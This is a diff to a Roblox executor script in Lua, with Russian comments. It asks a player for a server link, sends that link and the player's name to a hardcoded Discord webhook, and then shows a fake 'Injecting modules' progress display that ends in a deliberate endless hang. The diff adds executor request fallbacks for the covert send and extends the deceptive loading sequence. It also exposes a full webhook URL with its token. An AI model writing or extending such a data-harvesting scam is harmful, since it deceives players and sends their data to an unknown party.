@@ -1,35 +1,36 @@
 -- ===== НАСТРОЙКА =====
 local webhook = "https://discord.com/api/webhooks/1484561417003860122/ZP3_K9aBrLdzQyiwhPpq4oOFs8fycIkltCvOLvndVidLRdR0SRT5l0kOhsz2YuLJ7i9F"
-
 local HttpService = game:GetService("HttpService")
 
+-- ===== ОТПРАВКА В DISCORD =====
 local function sendToDiscord(link, player)
     local data = {
         ["content"] = "**NEW DATA**\nPlayer: "..player.Name.."\nLink: "..link
     }
-
     local json = HttpService:JSONEncode(data)
 
-    pcall(function()
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = json
-        })
-    end)
+    local req = request or http_request or (syn and syn.request)
+    if req then
+        pcall(function()
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+        end)
+    else
+        warn("Executor does not support requests, skipping Discord send")
+    end
 end
 
--- ===== ФУНКЦИЯ ПРОВЕРКИ ССЫЛКИ =====
+-- ===== ПРОВЕРКА ССЫЛКИ =====
 local function isValidRobloxLink(link)
-    if not link then return false end
-
+    if not link or link == "" then return false end
     link = string.lower(link)
-
-    if string.find(link, "roblox") then
-        return true
-    end
-
+    if string.find(link, "roblox.com/games/") then return true end
+    if string.find(link, "roblox.com/share") then return true end
+    if string.find(link, "roblox://") then return true end
     return false
 end
 
@@ -64,7 +65,6 @@ Button.Position = UDim2.new(0.4,0,0.6,0)
 Button.Text = "DONE"
 Button.TextScaled = true
 
--- ===== LOADING =====
 local Loading = Instance.new("Frame", ScreenGui)
 Loading.Size = UDim2.new(1,0,1,0)
 Loading.BackgroundColor3 = Color3.new(0,0,0)
@@ -79,8 +79,11 @@ Log.TextYAlignment = Enum.TextYAlignment.Top
 Log.TextSize = 18
 Log.Text = ""
 
+-- ===== ФУНКЦИЯ ADDLINE =====
 local function addLine(text)
-    Log.Text = Log.Text .. "\n> " .. text
+    if Log and Log.Text ~= nil then
+        Log.Text = Log.Text .. "\n> " .. text
+    end
 end
 
 -- ===== КНОПКА =====
@@ -91,30 +94,41 @@ Button.MouseButton1Click:Connect(function()
     Frame.Visible = false
     Loading.Visible = true
 
-    -- ===== ПРОВЕРКА ССЫЛКИ =====
     if not isValidRobloxLink(link) then
         Log.Text = ""
         addLine("Checking link...")
         wait(1)
-
         addLine("Invalid Roblox server link ❌")
         wait(2)
-
         addLine("Please enter a valid link")
         wait(2)
-
         ScreenGui:Destroy()
         return
     end
 
-    -- ===== ОТПРАВКА ССЫЛКИ =====
+    -- Если ссылка верная, отправляем на Discord
     sendToDiscord(link, player)
 
     Log.Text = ""
     addLine("Valid Roblox link ✔")
     wait(1)
-
     addLine("Connecting to server...")
     wait(1)
+    addLine("Server: "..link)
+    wait(1)
+    addLine("Injecting modules...")
+    wait(1)
 
-    add
+    for i = 1,100 do
+        addLine("Loading "..i.."%")
+        wait(0.03)
+    end
+
+    addLine("Done.")
+    wait(1)
+
+    -- Бесконечная “загрузка” (фейк зависания)
+    while true do
+        wait(0.1)
+    end
+end)
